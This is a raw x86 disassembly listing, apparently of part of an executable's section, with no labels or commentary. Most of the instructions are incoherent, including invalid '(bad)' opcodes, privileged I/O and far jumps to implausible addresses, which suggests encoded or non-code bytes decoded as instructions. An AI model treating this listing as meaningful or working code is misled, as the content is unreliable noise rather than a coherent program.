  406e32:	test   al,0x5f
  406e34:	push   DWORD PTR [ebp+eax*1+0x38]
  406e38:	ins    BYTE PTR es:[edi],dx
  406e39:	out    0xa4,al
  406e3b:	dec    edi
  406e3c:	and    ecx,0xffffffa4
  406e3f:	lds    eax,FWORD PTR [edx]
  406e41:	ret    0xe239
  406e44:	inc    esp
  406e45:	aad    0x43
  406e47:	imul   ecx,DWORD PTR [ebp+0x53aa922c],0xffffffd1
  406e4e:	ret    0x20
  406e51:	jmp    0x353fc116
  406e56:	ret    0xe8ac
  406e59:	jge    0x406e52
  406e5b:	pop    edx
  406e5c:	add    dl,bl
  406e5e:	and    bl,0xc2
  406e61:	xor    ch,bl
  406e63:	sbb    al,0xc
  406e65:	jmp    0x12c5278
	...
  406e92:	add    BYTE PTR [eax],al
  406e94:	xor    al,0xac
  406e96:	cmp    DWORD PTR [ebp+0x77],0x5b
  406e9a:	jne    0x406ea7
  406e9c:	dec    edi
  406e9d:	push   edi
  406e9e:	add    BYTE PTR [eax],al
  406ea0:	xchg   edi,eax
  406ea1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ea2:	pop    ebx
  406ea3:	leave  
  406ea4:	and    eax,0x928aff48
  406ea9:	inc    edi
  406eaa:	mov    edx,0x5b5700
  406eaf:	push   0x57
  406eb1:	add    al,0x75
  406eb3:	adc    BYTE PTR [eax-0x10f78afc],bh
  406eb9:	jp     0x406e89
  406ebb:	add    BYTE PTR [edi-0x26],dl
  406ebe:	mov    edi,0xf8586b7e
  406ec3:	sub    edx,ebp
  406ec5:	push   0xffffff83
  406ec7:	jge    0x406f00
  406ec9:	pop    ebx
  406eca:	jne    0x406ed3
  406ecc:	mov    WORD PTR [edi+0x0],ss
  406ecf:	add    BYTE PTR [edi],dl
  406ed1:	out    dx,al
  406ed2:	add    ebx,ebp
  406ed4:	pop    ebp
  406ed5:	int    0xc3
  406ed7:	pop    edi
  406ed8:	fmul   QWORD PTR [edi]
  406eda:	ret    0x170c
  406edd:	lods   al,BYTE PTR ds:[esi]
  406ede:	mov    ebp,esp
  406ee0:	xchg   esi,eax
  406ee1:	push   cs
  406ee2:	hlt    
  406ee3:	(bad)  
  406ee4:	loopne 0x406eea
  406ee6:	push   DWORD PTR [ebp-0x1d]
  406ee9:	rol    DWORD PTR [ebp-0xfaee0c],cl
  406eef:	(bad)  
  406ef0:	pop    edx
  406ef1:	(bad)  
  406ef2:	std    
  406ef3:	inc    DWORD PTR [eax]
  406ef5:	pop    eax
	...
  406f22:	out    0x1b,eax
  406f24:	test   esp,edi
  406f26:	xchg   ecx,eax
  406f27:	add    al,0xff
  406f29:	add    edi,edx
  406f2b:	pop    edx
  406f2c:	add    BYTE PTR [ebp-0xa8d6],cl
  406f32:	rol    BYTE PTR [esi*2+0x4b53e08],1
  406f39:	lea    edi,[ebx-0x66005618]
  406f3f:	je     0x406f5f
  406f41:	add    BYTE PTR [esp+eax*2],ah
  406f44:	jbe    0x406ecb
  406f46:	mov    al,dh
  406f48:	test   eax,0x459eeff
  406f4d:	call   0x44f591
  406f52:	mov    ebp,0x4274a9bc
  406f57:	cmp    ebx,eax
  406f59:	jne    0x406f95
  406f5b:	jno    0x406f21
  406f5d:	jmp    0x406fa2
  406f5f:	fadd   QWORD PTR [edx]
  406f61:	add    BYTE PTR [esi],bh
  406f63:	inc    esp
  406f64:	mov    edx,0x4e4436c2
  406f69:	mov    edx,DWORD PTR [edx-0x3f]
  406f6c:	sar    ah,0x8d
  406f6f:	sub    esp,ecx
  406f71:	push   0xffffff94
  406f73:	ins    DWORD PTR es:[edi],dx
  406f74:	das    
  406f75:	or     BYTE PTR [esi],dl
  406f77:	mov    bh,0xa9
  406f79:	jmp    DWORD PTR [ecx]
  406f7b:	cmp    ebx,eax
  406f7d:	je     0x406ff1
  406f7f:	jmp    0x7f9b:0x4c8bff4c
	...
  406fae:	add    BYTE PTR [eax],al
  406fb0:	or     DWORD PTR [ebp-0x58],eax
  406fb3:	or     edi,esi
  406fb5:	mov    BYTE PTR ds:0x4aa82eb,0x6a
  406fbc:	aas    
  406fbd:	mov    edi,0x258eff3e
  406fc2:	cs or  dh,dl
  406fc5:	jmp    0xbf7e707f
  406fca:	ret    
  406fcb:	jle    0x406fdb
  406fcd:	leave  
  406fce:	ds adc al,0x6
  406fd1:	jg     0x406f7c
  406fd3:	jne    0x407011
  406fd5:	rol    DWORD PTR [edx],1
  406fd7:	mov    edx,DWORD PTR [ebx]
  406fd9:	pop    ebx
  406fda:	cmc    
  406fdb:	jl     0x407029
  406fdd:	shr    ecx,0x1d
  406fe0:	aas    
  406fe1:	loopne 0x40700e
  406fe3:	test   eax,0xf8144e0e
  406fe8:	cwde   
  406fe9:	test   al,0xd9
  406feb:	test   al,0xb
  406fed:	pop    edi
  406fee:	xchg   ecx,eax
  406fef:	pop    esp
  406ff0:	dec    bp
  406ff2:	jbe    0x406fe0
  406ff4:	cli    
  406ff5:	push   0xfffffffb
  406ff7:	add    eax,0xcc6c5665
  406ffc:	jmp    0x2b24:0x5c471fe
  407003:	(bad)  
  407005:	test   al,0x62
  407007:	xchg   edi,eax
  407008:	mov    edi,0x51abe916
  40700d:	dec    ebp
  40700e:	call   0xa8:0x93c064dc
	...
  40703d:	add    bl,cl
  40703f:	bound  eax,QWORD PTR [ecx+0xb]
  407042:	cmp    DWORD PTR [ebp+0x26],ecx
  407045:	cld    
  407046:	icebp  
  407047:	mov    DWORD PTR [esi-0x63b37be3],0xe6219fb
  407051:	test   al,0x19
  407053:	popa   
  407054:	sub    DWORD PTR [esi],ebp
  407056:	cmp    al,0x40
  407058:	xchg   esi,eax
  407059:	or     BYTE PTR [ebx+0x1fbe96b],0x4d
  407060:	ja     0x407062
  407062:	mov    dh,0x5b
  407064:	icebp  
  407065:	add    edi,DWORD PTR [esi]
  407067:	inc    eax
  407068:	jmp    0x8e04:0x436b837a
  40706f:	fisub  WORD PTR [ebx+0x4]
  407072:	(bad)  
  407073:	dec    esp
  407074:	(bad)  
  407075:	push   esp
  407076:	rol    esi,1
  407078:	icebp  
  407079:	fwait
  40707a:	push   cs
  40707b:	push   ds
  40707c:	add    cl,ch
  40707e:	cmp    eax,0x3c30bfd6
  407083:	inc    eax
  407084:	sub    al,0x1c
  407086:	cmp    eax,0xdc6eb98
  40708b:	loopne 0x4070e1
  40708d:	in     eax,0x24
  40708f:	imul   ebp,DWORD PTR [edx-0x17],0xe984dded
  407096:	in     eax,0x4c
  407098:	call   FWORD PTR [ecx]
  40709a:	loope  0x407062
  40709c:	or     al,0x76
  40709e:	in     al,dx
  40709f:	push   0x58
  4070a1:	rol    BYTE PTR [eax],0x0
	...
  4070cc:	(bad)  
  4070cd:	push   0xffffff83
  4070cf:	in     al,0x4d
  4070d1:	pop    ebx
  4070d2:	jne    0x4070be
  4070d4:	cld    
  4070d5:	aas    
  4070d6:	add    al,0x6c
  4070d8:	jne    0x4070a1
  4070da:	cdq    
  4070db:	bound  edi,QWORD PTR [ebp-0x50]
  4070de:	leave  
  4070df:	sub    edx,DWORD PTR [esi+0x4c]
  4070e2:	push   esp
  4070e3:	jb     0x40708b
  4070e5:	fadd   st,st(3)
  4070e7:	xor    ecx,esi
  4070e9:	xchg   edi,edi
  4070eb:	ret    
  4070ec:	cmp    eax,0x359cffa4
  4070f1:	xor    al,0xc4
  4070f3:	ss loope 0x407141
  4070f6:	(bad)  
  4070f7:	lods   al,BYTE PTR ds:[esi]
  4070f8:	fstp   DWORD PTR [edx+0x0]
  4070fb:	jmp    0xf195513d
  407100:	xchg   esp,eax
  407101:	imul   ecx,DWORD PTR [ebp+0x6aaad5a4],0xfc9686ed
  40710b:	cdq    
  40710c:	mov    al,ds:0x8fe608c5
  407111:	pop    edi
  407112:	inc    edi
  407113:	push   0xe30d4f16
  407118:	out    0x61,al
  40711a:	je     0x4070ff
  40711c:	mov    esp,0xe700f8cd
  407121:	mov    cl,cl
  407123:	xor    edx,DWORD PTR [edi-0x6f74fb10]
  407129:	fdivr  DWORD PTR [edi-0x3df1b7fd]
  40712f:	add    al,0x0
	...
  407159:	add    BYTE PTR [edi+0x14ec8baa],ah
  40715f:	or     al,0xf4
  407161:	push   ebx
  407162:	pusha  
  407163:	outs   dx,DWORD PTR ds:[esi]
  407164:	cwde   
  407165:	cmp    ah,BYTE PTR [edi-0x271317a9]
  40716b:	hlt    
  40716c:	dec    BYTE PTR [ecx+0x458d0362]
  407172:	add    ebp,DWORD PTR [eax-0xb2fd618]
  407178:	(bad)  
  407179:	xor    edi,esp
  40717b:	jno    0x40719b
  40717d:	push   0x6d
  40717f:	outs   dx,DWORD PTR ds:[esi]
  407180:	add    dl,bh
  407182:	push   edi
  407183:	push   edi
  407184:	push   DWORD PTR [ebp-0xd]
  407187:	hlt    
  407188:	je     0x407192
  40718a:	out    dx,eax
  40718b:	retf   
  40718c:	(bad)  
  40718d:	dec    DWORD PTR [eax]
  40718f:	fstp   TBYTE PTR [edi+0x47d30f]
  407195:	add    BYTE PTR [edi],ah
  407197:	add    dh,BYTE PTR [ebp-0xc]
  40719a:	dec    edi
  40719b:	adc    edi,0xff3348ff
  4071a1:	stc    
  4071a2:	pop    ss
  4071a3:	pop    edi
  4071a4:	jbe    0x4071ab
  4071a6:	bound  eax,QWORD PTR ds:[ecx]
  4071a9:	add    BYTE PTR [edi],ah
  4071ab:	add    dh,BYTE PTR [ebp-0xc]
  4071ae:	das    
  4071af:	xchg   esp,eax
  4071b0:	(bad)  
  4071b1:	dec    DWORD PTR [eax]
  4071b3:	retf   
  4071b4:	shl    BYTE PTR [ebx+eiz*1+0x1],0x75
  4071b9:	hlt    
  4071ba:	pinsrw mm3,ecx,0xff
	...
  4071e6:	add    BYTE PTR [eax],al
  4071e8:	or     ch,al
  4071ea:	push   ebp
  4071eb:	hlt    
  4071ec:	ds mov ebp,0x9c3e6a12
  4071f2:	lock and BYTE PTR [esi],bh
  4071f5:	xor    al,0xa4
  4071f7:	jne    0x4071c3
  4071f9:	or     DWORD PTR [edi],ebp
  4071fb:	hlt    
  4071fc:	shl    DWORD PTR [esi-0x8],0xc6
  407200:	add    ecx,DWORD PTR [esp+eax*1]
  407203:	add    BYTE PTR [esi],bh
  407205:	xor    al,0x1b
  407207:	psubw  mm6,QWORD PTR [edx+0x4]
  40720b:	jmp    FWORD PTR [ebx]
  40720d:	lock fwait
  40720f:	into   
  407210:	test   DWORD PTR [ebx+eax*1],esi
  407213:	push   ebx
  407214:	inc    ebp
  407215:	hlt    
  407216:	das    
  407217:	ss mov ch,0xdc
  40721a:	sbb    ecx,DWORD PTR [edi]
  40721c:	icebp  
  40721d:	jb     0x407223
  40721f:	call   0x44707d
  407224:	cmp    eax,0xb5474dbc
  407229:	mov    DWORD PTR [ebx-0x6c],ebp
  40722c:	dec    edi
  40722d:	xor    al,0x3
  40722f:	mov    al,0x4b
  407231:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407232:	push   esi
  407233:	mov    eax,0x323aa
  407238:	adc    eax,0x4147be73
  40723d:	xor    al,0x4c
  40723f:	push   ebx
  407240:	fdivr  QWORD PTR es:[eax+0x3fcb3e00]
  407247:	clc    
  407248:	mov    DWORD PTR [edx+0xff3d],eax
	...
  407276:	xor    edx,DWORD PTR [ecx]
  407278:	dec    eax
  407279:	push   0x41e939
  40727e:	adc    edi,eax
  407280:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407281:	call   0x44ff49
  407286:	ins    DWORD PTR es:[edi],dx
  407287:	cmp    eax,0xbd8274c3
  40728c:	lods   al,BYTE PTR ds:[esi]
  40728d:	push   0x43365b51
  407292:	xor    esi,DWORD PTR ds:[edi-0x15a4c146]
  407299:	stos   DWORD PTR es:[edi],eax
  40729a:	jno    0x40723e
  40729c:	(bad)  
  40729d:	les    edx,FWORD PTR [edi+0x3e03d7ee]
  4072a3:	or     ebp,esp
  4072a5:	mov    cl,0x90
  4072a7:	add    bl,BYTE PTR [ebp+0x12]
  4072aa:	ds pop ebx
  4072ac:	add    al,bl
  4072ae:	js     0x407251
  4072b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4072b1:	add    edx,DWORD PTR [ecx]
  4072b3:	scas   al,BYTE PTR es:[edi]
  4072b4:	xchg   ecx,eax
  4072b5:	pusha  
  4072b6:	nop
  4072b7:	dec    ecx
  4072b8:	xchg   esi,eax
  4072b9:	js     0x4072ae
  4072bb:	push   0xffffffe2
  4072bd:	ror    DWORD PTR [edx],1
  4072bf:	pop    edi
  4072c0:	jo     0x4072c3
  4072c2:	xchg   ebp,eax
  4072c3:	pusha  
  4072c4:	sbb    DWORD PTR [eax+esi*2+0x19a47628],ebx
  4072cb:	and    DWORD PTR [esi],esp
  4072cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4072ce:	inc    ebx
  4072cf:	stos   BYTE PTR es:[edi],al
  4072d0:	ret    0xf3a4
  4072d3:	dec    esi
  4072d4:	push   ecx
  4072d5:	fild   DWORD PTR [esi+0x805649]
	...
  407303:	add    bl,bl
  407305:	inc    edx
  407306:	jmp    0xac62ac37
  40730b:	stos   DWORD PTR es:[edi],eax
  40730c:	ds pop ebx
  40730e:	mov    DWORD PTR [ebx],eax
  407310:	inc    ecx
  407311:	iret   
  407312:	xor    DWORD PTR [ebx+esi*4+0x462e2e4f],esp
  407319:	xor    ecx,DWORD PTR [esi]
  40731b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40731c:	sub    DWORD PTR [ecx+0x1e],ecx
  40731f:	sub    dh,BYTE PTR cs:[ecx+edx*4]
  407323:	int    0x19
  407325:	dec    ecx
  407326:	loop   0x4072eb
  407328:	mov    ebx,DWORD PTR [ebp+0x12]
  40732b:	or     BYTE PTR ds:0xb50c751b,dh
  407331:	scas   al,BYTE PTR es:[edi]
  407332:	add    ch,bh
  407334:	jno    0x4073a3
  407336:	push   DWORD PTR [ecx+ebp*8+0x49]
  40733a:	jne    0x407319
  40733c:	popf   
  40733d:	lods   eax,DWORD PTR ds:[esi]
  40733e:	xor    al,0x64
  407340:	cli    
  407341:	ret    
  407342:	add    eax,0x5b4392
  407347:	jmp    0x7335220c
  40734c:	ror    BYTE PTR [ecx+0x75],1
  40734f:	mov    ch,0x9d
  407351:	lods   eax,DWORD PTR ds:[esi]
  407352:	or     BYTE PTR [esi+0x41e84757],dh
  407358:	jl     0x4073a2
  40735a:	push   DWORD PTR [edx-0x7f]
  40735d:	test   al,0x5b
  40735f:	mov    al,0x78
  407361:	push   edi
  407362:	add    BYTE PTR [ecx+ecx*8],bh
  407365:	aaa    
  407366:	and    DWORD PTR [ebp+0x0],0x0
	...
  407391:	add    dl,ch
  407393:	scas   eax,DWORD PTR es:[edi]
  407394:	push   ebx
  407395:	ror    al,cl
  407397:	mov    bl,0x0
  407399:	leave  
  40739a:	cmp    eax,0x7c0ae85b
  40739f:	dec    eax
  4073a0:	jmp    DWORD PTR [eax+0x7]
  4073a3:	inc    edi
  4073a4:	push   0xff485de9
  4073a9:	push   ecx
  4073aa:	and    al,0x29
  4073ac:	call   DWORD PTR [esi-0x35]
  4073af:	sahf   
  4073b0:	mov    ah,0xc1
  4073b2:	cmp    eax,0x95e9007b
  4073b7:	xchg   edx,eax
  4073b8:	fidivr WORD PTR [esi]
  4073ba:	popf   
  4073bb:	rol    BYTE PTR [ebp+esi*2-0x31],cl
  4073bf:	(bad)
  4073c2:	push   ds
  4073c3:	dec    eax
  4073c4:	(bad)  
  4073c5:	jmp    0x54337bda
  4073ca:	cmc    
  4073cb:	popf   
  4073cc:	rcl    ch,0x3d
  4073cf:	pop    ebx
  4073d0:	add    BYTE PTR [esi],ah
  4073d2:	xchg   DWORD PTR [edi],ebp
  4073d4:	inc    DWORD PTR [eax]
  4073d6:	and    BYTE PTR [eax+eax*1-0x39],bl
  4073da:	(bad)  
  4073dc:	(bad)  
  4073dd:	pop    ds
  4073de:	out    0x5b,eax
  4073e0:	push   DWORD PTR [ebp-0x1d]
  4073e3:	in     al,dx
  4073e4:	inc    esp
  4073e5:	shl    al,1
  4073e7:	bound  esi,QWORD PTR [edi+ecx*4+0x458d0b1a]
  4073ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4073ef:	mov    ebp,DWORD PTR [eax+0x0]
  4073f2:	out    0x5b,eax
  4073f4:	sub    BYTE PTR [edx+0x0],0x0
	...
  407420:	xlat   BYTE PTR ds:[ebx]
  407421:	cld    
  407422:	je     0x40742c
  407424:	out    dx,eax
  407425:	test   dl,cl
  407427:	add    BYTE PTR [edi-0x668b3fa8],ah
  40742d:	loopne 0x4074ab
  40742f:	rcl    BYTE PTR [edi-0x2e16fa9e],1
  407435:	pop    ebx
  407436:	add    BYTE PTR [eax],al
  407438:	call   0xa14024cf
  40743d:	pop    ebx
  40743e:	add    BYTE PTR [ebp-0xaf50a6],cl
  407444:	mov    ah,BYTE PTR [edi+0x5b670068]
  40744a:	or     BYTE PTR [ebp-0x17afe0e6],0x45
  407451:	sbb    DWORD PTR [eax],eax
  407453:	add    BYTE PTR [ebx+ebx*1+0x75],ch
  407457:	add    eax,0xb6fe
  40745c:	fadd   DWORD PTR [si-0x4c]
  407460:	sbb    DWORD PTR [eax+eax*1-0x73],ebx
  407464:	sbb    BYTE PTR [ebx],0xb9
  407467:	cmp    al,0x27
  407469:	pop    ebx
  40746a:	add    BYTE PTR [ebx],dh
  40746c:	addr16 in eax,dx
  40746e:	test   eax,0x3c1adac7
  407473:	add    BYTE PTR [edi],dl
  407475:	pop    ebx
  407476:	push   DWORD PTR [ebp+0x3e]
  407479:	test   al,0x92
  40747b:	inc    ebp
  40747c:	and    bh,BYTE PTR [esi+0x48]
  40747f:	aam    0x9
  407481:	add    eax,DWORD PTR ds:[eax]
	...
  4074ac:	add    BYTE PTR [eax],al
  4074ae:	stc    
  4074af:	call   DWORD PTR [edx+0x33459ff]
  4074b5:	lea    edi,[ebx+0x74]
  4074b8:	xor    ebp,DWORD PTR [edx+0x3e]
  4074bb:	stos   BYTE PTR es:[edi],al
  4074bc:	add    al,0xff
  4074be:	imul   ebp,eax,0xffffffab
  4074c1:	out    0x7,al
  4074c3:	xor    eax,0xb0fe0b03
  4074c8:	or     al,BYTE PTR [ebx+0x7503e44b]
  4074ce:	cmp    al,0x29
  4074d0:	and    al,0xff
  4074d2:	xor    edx,DWORD PTR [eax]
  4074d4:	mov    eax,ds:0xeb9cea75
  4074d9:	dec    esi
  4074da:	push   DWORD PTR [ebx]
  4074dc:	mov    al,ds:0x1aece275
  4074e1:	leave  
  4074e2:	ds xor al,0x84
  4074e5:	les    ebp,FWORD PTR [esi]
  4074e7:	and    eax,0x64664558
  4074ec:	add    BYTE PTR cs:[ecx+0x68e89f4f],al
  4074f3:	retf   0xffa1
  4074f6:	inc    ebp
  4074f7:	hlt    
  4074f8:	push   ss
  4074f9:	add    dl,BYTE PTR [ebp+0x67]
  4074fc:	mov    eax,DWORD PTR [ebp-0x5a]
  4074ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407500:	pop    ss
  407501:	mov    esp,0xcb4266
  407506:	ds add al,0xa0
  407509:	jne    0x407495
  40750b:	popf   
  40750c:	pop    ss
  40750d:	mov    eax,0xff9bef56
	...
  40753a:	add    BYTE PTR [eax],al
  40753c:	cmp    DWORD PTR [ecx],edi
  40753e:	ret    
  40753f:	jne    0x40757d
  407541:	cdq    
  407542:	hlt    
  407543:	(bad)  
  407544:	mov    bl,0x5b
  407546:	stc    
  407547:	mov    al,ds:0x171e57ab
  40754c:	(bad)  
  40754d:	xor    bl,ah
  40754f:	sahf   
  407550:	adc    DWORD PTR [esi+0x62],eax
  407553:	mov    esp,0xac41d009
  407558:	cld    
  407559:	adc    ebp,ecx
  40755b:	add    edi,ecx
  40755d:	iret   
  40755e:	cmp    eax,0xee2844ac
  407563:	mov    al,ds:0xaba5cfe9
  407568:	cmp    al,0x28
  40756a:	fisub  WORD PTR [eax-0x542a3027]
  407570:	aam    0x26
  407572:	into   
  407573:	mov    al,ds:0x412219b5
  407578:	neg    DWORD PTR [eax]
  40757a:	in     eax,dx
  40757b:	add    edx,DWORD PTR [ebx]
  40757d:	rol    ah,cl
  40757f:	test   BYTE PTR [edx+0x46],bh
  407582:	bound  eax,QWORD PTR [esi+0x3a]
  407585:	push   edx
  407586:	test   eax,0xe91e3817
  40758b:	add    edi,DWORD PTR [esi]
  40758d:	pop    ebx
  40758e:	jmp    0xe987715b
  407593:	add    edi,DWORD PTR [esi]
  407595:	pop    ebx
  407596:	je     0x4075de
  407598:	sub    BYTE PTR [edx+0x464a167e],0xfc
  40759f:	or     eax,DWORD PTR [eax]
	...
  4075c9:	add    BYTE PTR [esi-0x4d],ah
  4075cc:	outs   dx,DWORD PTR ds:[esi]
  4075cd:	mov    al,ds:0x9fe3d969
  4075d2:	ds iret 
  4075d4:	imul   BYTE PTR ds:0xfdc463e
  4075da:	push   ecx
  4075db:	iret   
  4075dc:	dec    ebp
  4075dd:	stos   DWORD PTR es:[edi],eax
  4075de:	lock inc esp
  4075e0:	inc    esi
  4075e1:	mov    al,ds:0x9fb445ee
  4075e6:	es idiv edi
  4075e9:	adc    al,0xde
  4075eb:	inc    esp
  4075ec:	pop    eax
  4075ed:	and    BYTE PTR [ebx],al
  4075ef:	push   esp
  4075f0:	add    BYTE PTR [edx+esi*4-0x46da7cc9],bh
  4075f7:	mov    ebp,0x5ab1acc7
  4075fc:	add    BYTE PTR [edi-0x1801610a],al
  407602:	cmp    eax,0x806c04b1
  407607:	inc    edi
  407608:	push   eax
  407609:	cmp    DWORD PTR [ebp+0x15e9005b],0x3de9ff44
  407613:	inc    esp
  407614:	jne    0x407607
  407616:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407617:	popf   
  407618:	leave  
  407619:	jmp    0xe602885b
  40761e:	cmp    eax,0xbdd58bae
  407623:	pop    ds
  407624:	lods   al,BYTE PTR ds:[esi]
  407625:	push   ss
  407626:	ins    DWORD PTR es:[edi],dx
  407627:	sbb    al,0x45
  407629:	test   DWORD PTR [edx],edi
  40762b:	pop    ebx
  40762c:	add    cl,ch
	...
  407656:	add    BYTE PTR [eax],al
  407658:	mov    WORD PTR [ecx],fs
  40765a:	push   0xff44ade9
  40765f:	xchg   ecx,eax
  407660:	xor    BYTE PTR [edi],ah
  407662:	call   DWORD PTR [esi+0x1c09ec3]
  407668:	inc    edx
  407669:	imul   eax,DWORD PTR [eax],0xffffffe9
  40766c:	aad    0xb2
  40766e:	fdivr  QWORD PTR [esi-0x27]
  407671:	rol    BYTE PTR [ecx+esi*1+0x22],cl
  407675:	pop    ebx
  407676:	adc    cl,ch
  407678:	cmp    eax,0xc1455c33
  40767d:	inc    esp
  40767e:	mov    DWORD PTR [ecx+edi*8-0xcd2832b],esp
  407685:	xchg   BYTE PTR [eax],al
  407687:	jmp    0x100fec9
  40768c:	add    al,0xb1
  40768e:	mov    DWORD PTR [ebp+0x63],0x27ffff3b
  407695:	in     eax,0x74
  407697:	ror    BYTE PTR [eax-0x3d002b6e],0x9f
  40769e:	pop    DWORD PTR [ebp+0x37]
  4076a1:	sbb    al,0x45
  4076a3:	fsubr  DWORD PTR [eax]
  4076a5:	push   esp
  4076a6:	add    BYTE PTR [eax],al
  4076a8:	pusha  
  4076a9:	xchg   edx,eax
  4076aa:	hlt    
  4076ab:	dec    DWORD PTR [eax]
  4076ad:	pop    eax
  4076ae:	add    BYTE PTR [ebp+0x68501ba2],cl
  4076b4:	out    0x57,eax
  4076b6:	add    BYTE PTR [eax+0x75ff57bd],al
	...
  4076e4:	add    BYTE PTR [eax],al
  4076e6:	out    dx,eax
  4076e7:	out    dx,eax
  4076e8:	imul   ecx,eax,0xc00b57e7
  4076ee:	jae    0x40774d
  4076f0:	cmp    DWORD PTR [ebp-0x6d],0x57
  4076f4:	jne    0x4076fb
  4076f6:	out    dx,al
  4076f7:	cli    
  4076f8:	(bad)  
  4076f9:	jmp    DWORD PTR [edi-0x174fbae4]
  4076ff:	push   esp
  407700:	add    BYTE PTR [eax],al
  407702:	or     dl,BYTE PTR [ebx+0x62d850b0]
  407708:	mov    esp,0x57a768
  40770d:	sbb    BYTE PTR [edx],0x93
  407710:	les    edx,FWORD PTR [eax-0x41]
  407713:	xchg   edx,eax
  407714:	enter  0x9700,0x50
  407718:	shl    BYTE PTR [ebp+0x62],0xf6
  40771c:	xlat   BYTE PTR ds:[ebx]
  40771d:	add    BYTE PTR [edi+0x57],ah
  407720:	mov    eax,DWORD PTR [ebp+0x2f]
  407723:	push   ds
  407724:	add    BYTE PTR [eax],al
  407726:	jmp    0x5f:0x3bb9c47a
  40772d:	add    BYTE PTR [esi],bh
  40772f:	popa   
  407730:	(bad)  
  407731:	repz xchg esp,eax
  407733:	jl     0x40777d
  407735:	les    eax,FWORD PTR [edx]
  407737:	xor    al,BYTE PTR [ebx]
  407739:	add    BYTE PTR [ecx],bh
  40773b:	or     BYTE PTR [ebx-0x71],bl
  40773e:	jnp    0x4076c4
  407740:	mov    BYTE PTR [ebp+0x6],0x72
  407744:	push   cs
  407745:	add    BYTE PTR [esi],bh
  407747:	jno    0x407791
  407749:	hlt    
	...
  407772:	add    BYTE PTR [eax],al
  407774:	sbb    DWORD PTR [edx],esi
  407776:	add    eax,DWORD PTR [eax]
  407778:	ret    
  407779:	out    dx,eax
  40777a:	(bad)  
  40777b:	push   eax
  40777c:	xchg   esp,eax
  40777d:	xor    al,0x29
  40777f:	add    BYTE PTR [ecx],al
  407781:	rcr    BYTE PTR [edi-0x18],0xf7
  407785:	jns    0x40778a
  407787:	add    BYTE PTR [ebp+0x74],al
  40778a:	pop    ss
  40778b:	push   es
  40778c:	mov    ebp,0x6b00b7af
  407791:	das    
  407792:	stos   BYTE PTR es:[edi],al
  407793:	mov    WORD PTR [esi],?
  407795:	xor    al,0x3
  407797:	dec    DWORD PTR [ebx+0x44]
  40779a:	pushf  
  40779b:	jne    0x40779b
  40779d:	adc    DWORD PTR [edi],edx
  40779f:	mov    eax,0x414d3d56
  4077a4:	add    DWORD PTR ds:[edi],edx
  4077a7:	mov    esp,0xc5b2a6
  4077ac:	ds mov ch,0xc8
  4077af:	adc    al,0x31
  4077b1:	mov    eax,ds:0x6deedc47
  4077b6:	add    al,0xff
  4077b8:	or     esi,esp
  4077ba:	stos   DWORD PTR es:[edi],eax
  4077bb:	sti    
  4077bc:	xchg   cl,dl
  4077be:	pushf  
  4077bf:	or     edi,DWORD PTR [esi+0x3f]
  4077c2:	add    ebx,ebp
  4077c4:	sbb    bl,cl
  4077c6:	inc    edi
  4077c7:	mov    ah,0x71
  4077c9:	aas    
  4077ca:	push   edi
  4077cb:	call   0xffde2a6f
  4077d0:	popa   
  4077d1:	pop    ebx
  4077d2:	fcomp  QWORD PTR [edi+0x66]
  4077d5:	push   0x27
  4077d7:	add    al,0x0
	...
  407801:	add    BYTE PTR [esi],bh
  407803:	stos   DWORD PTR es:[edi],eax
  407804:	push   esi
  407805:	pop    ss
  407806:	mov    al,BYTE PTR [edx-0x2c]
  407809:	push   edi
  40780a:	push   esi
  40780b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40780c:	inc    eax
  40780d:	popf   
  40780e:	cmp    DWORD PTR [esi+0x29],edx
  407811:	pop    ss
  407812:	cmp    al,0x36
  407814:	clc    
  407815:	sub    BYTE PTR [ebx+0x4a17e96b],0x42
  40781c:	pushf  
  40781d:	repz sbb al,cl
  407820:	in     eax,dx
  407821:	pushf  
  407822:	mov    eax,DWORD PTR [edi]
  407824:	add    DWORD PTR [edi+eax*1+0x42],eax
  407828:	push   cs
  407829:	or     esi,edi
  40782b:	(bad)  
  40782c:	jmp    0x4077d6
  40782e:	push   ecx
  40782f:	(bad)  
  407830:	and    BYTE PTR [ecx],cl
  407832:	adc    eax,0x838ed8c7
  407837:	out    dx,eax
  407838:	cwde   
  407839:	pushf  
  40783a:	imul   esp,DWORD PTR [edi-0x1a],0x16
  40783e:	xchg   edx,eax
  40783f:	xor    al,BYTE PTR [eax]
  407841:	cdq    
  407842:	rol    DWORD PTR [ecx+0x62],1
  407845:	mov    ebx,0xab95c7c9
  40784a:	cwde   
  40784b:	sbb    ecx,ebp
  40784d:	add    edi,DWORD PTR [ecx-0x5f545639]
  407853:	and    al,0xb6
  407855:	pushf  
  407856:	test   eax,0x98ab6dc7
  40785b:	and    al,0xa6
  40785d:	pushf  
  40785e:	cdq    
  40785f:	(bad)  
  407860:	popa   
  407861:	stos   DWORD PTR es:[edi],eax
  407862:	jo     0x407888
  407864:	xchg   esi,eax
  407865:	pushf  
	...
  40788e:	add    BYTE PTR [eax],al
  407890:	mov    ebp,0xa033dbf
  407895:	push   ebx
  407896:	xchg   BYTE PTR [esi],dl
  407898:	stos   BYTE PTR es:[edi],al
  407899:	xor    bl,BYTE PTR [ecx+0x4171b9]
  40789f:	bound  edi,QWORD PTR [esi-0x5b]
  4078a2:	pop    edi
  4078a3:	mov    al,ds:0xbc006a7f
  4078a8:	(bad)  
  4078a9:	and    DWORD PTR cs:0x322badb5,0xffffffbe
  4078b1:	mov    edi,0x9129e90c
  4078b6:	add    esp,0x2d
  4078b9:	inc    ecx
  4078ba:	jae    0x40786d
  4078bc:	rcl    BYTE PTR [esi-0x39356604],0xc
  4078c3:	inc    ecx
  4078c4:	sahf   
  4078c5:	sbb    DWORD PTR [eax],eax
  4078c7:	jmp    0xd9b8948c
  4078cc:	mov    dl,0xc6
  4078ce:	or     al,0x1
  4078d0:	xor    ch,BYTE PTR ds:0x96b40eff
  4078d6:	clc    
  4078d7:	push   es
  4078d8:	push   eax
  4078d9:	aas    
  4078da:	call   0x9c716c
